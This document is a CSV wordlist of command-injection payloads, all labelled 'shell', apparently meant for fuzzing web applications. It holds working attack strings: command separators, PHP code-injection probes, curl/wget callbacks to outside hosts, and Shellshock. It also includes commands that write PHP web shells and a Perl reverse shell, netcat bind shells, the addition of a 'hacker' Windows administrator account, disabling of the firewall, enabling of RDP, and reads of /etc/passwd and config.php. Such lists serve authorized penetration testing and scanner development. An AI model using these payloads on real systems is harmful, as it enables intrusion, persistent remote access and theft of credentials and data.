Payloads,Types
"<?php system(""cat /etc/passwd"");?>",shell
`,shell
||,shell
|,shell
;,shell
',shell
"'""",shell
"""",shell
"""'",shell
&,shell
&&,shell
%0a,shell
%0a%0d,shell
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",shell
%20{${phpinfo()}},shell
%20{${sleep(20)}},shell
%20{${sleep(3)}},shell
a|id|,shell
a;id\n,shell
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,shell
| curl http://crowdshield.com/.testing/rce.txt,shell
& curl http://crowdshield.com/.testing/rce.txt,shell
; curl https://crowdshield.com/.testing/rce_vuln.txt,shell
&& curl https://crowdshield.com/.testing/rce_vuln.txt,shell
curl https://crowdshield.com/.testing/rce_vuln.txt,shell
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",shell
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),shell
dir,shell
| dir,shell
; dir,shell
$(`dir`),shell
& dir,shell
&&dir,shell
&& dir,shell
| dir C:\,shell
; dir C:\,shell
& dir C:\,shell
&& dir C:\,shell
dir C:\,shell
| dir C:\Documents and Settings\*,shell
; dir C:\Documents and Settings\*,shell
& dir C:\Documents and Settings\*,shell
&& dir C:\Documents and Settings\*,shell
dir C:\Documents and Settings\*,shell
| dir C:\Users,shell
; dir C:\Users,shell
& dir C:\Users,shell
&& dir C:\Users,shell
dir C:\Users,shell
;echo%20'<script>alert(1)</script>',shell
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,shell
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",shell
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",shell
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",shell
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",shell
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",shell
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php",shell
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",shell
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",shell
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",shell
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",shell
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",shell
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",shell
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",shell
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",shell
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",shell
;echo '<script>alert(1)</script>',shell
echo '<script>alert(1)</script>'// XXXXXXXXXXX,shell
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,shell
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",shell
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",shell
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",shell
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",shell
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",shell
() { :;}; echo vulnerable 10,shell
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),shell
eval('ls'),shell
eval('pwd'),shell
eval('pwd');,shell
eval('sleep 5'),shell
eval('sleep 5');,shell
eval('whoami'),shell
eval('whoami');,shell
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),shell
exec('ls'),shell
exec('pwd'),shell
exec('pwd');,shell
exec('sleep 5'),shell
exec('sleep 5');,shell
exec('whoami'),shell
exec('whoami');,shell
";{$_GET[""cmd""]}",shell
&&id,shell
ifconfig,shell
| ifconfig,shell
; ifconfig,shell
& ifconfig,shell
&& ifconfig,shell
ipconfig,shell
| ipconfig /all,shell
; ipconfig /all,shell
& ipconfig /all,shell
&& ipconfig /all,shell
ipconfig /all,shell
ls,shell
$(`ls`),shell
| ls -l /,shell
; ls -l /,shell
& ls -l /,shell
&& ls -l /,shell
ls -l /,shell
| ls -laR /etc,shell
; ls -laR /etc,shell
& ls -laR /etc,shell
&& ls -laR /etc,shell
| ls -laR /var/www,shell
; ls -laR /var/www,shell
& ls -laR /var/www,shell
&& ls -laR /var/www,shell
| ls -l /etc/,shell
; ls -l /etc/,shell
& ls -l /etc/,shell
&& ls -l /etc/,shell
ls -l /etc/,shell
ls -lh /etc/,shell
| ls -l /home/*,shell
; ls -l /home/*,shell
& ls -l /home/*,shell
&& ls -l /home/*,shell
ls -l /home/*,shell
*; ls -lhtR /var/www/,shell
| ls -l /tmp,shell
; ls -l /tmp,shell
& ls -l /tmp,shell
&& ls -l /tmp,shell
ls -l /tmp,shell
| ls -l /var/www/*,shell
; ls -l /var/www/*,shell
& ls -l /var/www/*,shell
&& ls -l /var/www/*,shell
ls -l /var/www/*,shell
\n,shell
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,shell
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,shell
| nc -lvvp 4444 -e /bin/sh|,shell
; nc -lvvp 4444 -e /bin/sh;,shell
& nc -lvvp 4444 -e /bin/sh&,shell
&& nc -lvvp 4444 -e /bin/sh &,shell
nc -lvvp 4444 -e /bin/sh,shell
nc -lvvp 4445 -e /bin/sh &,shell
nc -lvvp 4446 -e /bin/sh|,shell
nc -lvvp 4447 -e /bin/sh;,shell
nc -lvvp 4448 -e /bin/sh&,shell
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,shell
\necho INJECTX\nexit\n\033[2Asleep 5\n,shell
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,shell
| net localgroup Administrators hacker /ADD,shell
; net localgroup Administrators hacker /ADD,shell
& net localgroup Administrators hacker /ADD,shell
&& net localgroup Administrators hacker /ADD,shell
net localgroup Administrators hacker /ADD,shell
| netsh firewall set opmode disable,shell
; netsh firewall set opmode disable,shell
& netsh firewall set opmode disable,shell
&& netsh firewall set opmode disable,shell
netsh firewall set opmode disable,shell
netstat,shell
| netstat -an,shell
; netstat -an,shell
& netstat -an,shell
&& netstat -an,shell
netstat -an,shell
| net user hacker Password1 /ADD,shell
; net user hacker Password1 /ADD,shell
& net user hacker Password1 /ADD,shell
&& net user hacker Password1 /ADD,shell
net user hacker Password1 /ADD,shell
| net view,shell
; net view,shell
& net view,shell
&& net view,shell
net view,shell
"perl -e 'print ""X""x1024'",shell
"|| perl -e 'print ""X""x16096'",shell
"| perl -e 'print ""X""x16096'",shell
"; perl -e 'print ""X""x16096'",shell
"& perl -e 'print ""X""x16096'",shell
"&& perl -e 'print ""X""x16096'",shell
"perl -e 'print ""X""x16384'",shell
"; perl -e 'print ""X""x2048'",shell
"& perl -e 'print ""X""x2048'",shell
"&& perl -e 'print ""X""x2048'",shell
"perl -e 'print ""X""x2048'",shell
"|| perl -e 'print ""X""x4096'",shell
"| perl -e 'print ""X""x4096'",shell
"; perl -e 'print ""X""x4096'",shell
"& perl -e 'print ""X""x4096'",shell
"&& perl -e 'print ""X""x4096'",shell
"perl -e 'print ""X""x4096'",shell
"|| perl -e 'print ""X""x8096'",shell
"| perl -e 'print ""X""x8096'",shell
"; perl -e 'print ""X""x8096'",shell
"&& perl -e 'print ""X""x8096'",shell
"perl -e 'print ""X""x8192'",shell
"perl -e 'print ""X""x81920'",shell
|| phpinfo(),shell
| phpinfo(),shell
{${phpinfo()}},shell
;phpinfo(),shell
;phpinfo();//,shell
';phpinfo();//,shell
& phpinfo(),shell
&& phpinfo(),shell
phpinfo(),shell
phpinfo();,shell
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",shell
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",shell
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",shell
"<?php system(""sleep 10"");?>",shell
"<?php system(""sleep 5"");?>",shell
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",shell
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",shell
:phpversion();,shell
;${@print(md5(RCEVulnerable))};,shell
"${@print(""RCEVulnerable"")}",shell
${@print(system($_SERVER['HTTP_USER_AGENT']))},shell
pwd,shell
| pwd,shell
; pwd,shell
& pwd,shell
&& pwd,shell
\r,shell
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",shell
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",shell
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",shell
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",shell
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",shell
\r\n,shell
route,shell
| sleep 1,shell
; sleep 1,shell
& sleep 1,shell
&& sleep 1,shell
sleep 1,shell
|| sleep 10,shell
| sleep 10,shell
; sleep 10,shell
{${sleep(10)}},shell
& sleep 10,shell
&& sleep 10,shell
sleep 10,shell
|| sleep 15,shell
| sleep 15,shell
; sleep 15,shell
& sleep 15,shell
&& sleep 15,shell
{${sleep(20)}},shell
{${sleep(3)}},shell
| sleep 5,shell
; sleep 5,shell
& sleep 5,shell
&& sleep 5,shell
sleep 5,shell
{${sleep(hexdec(dechex(20)))}},shell
sysinfo,shell
| sysinfo,shell
; sysinfo,shell
& sysinfo,shell
&& sysinfo,shell
system('cat C:\boot.ini');,shell
system('cat config.php');,shell
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,shell
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,shell
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,shell
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,shell
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,shell
system('curl https://crowdshield.com/.testing/rce_vuln.txt'),shell
system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),shell
system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,shell
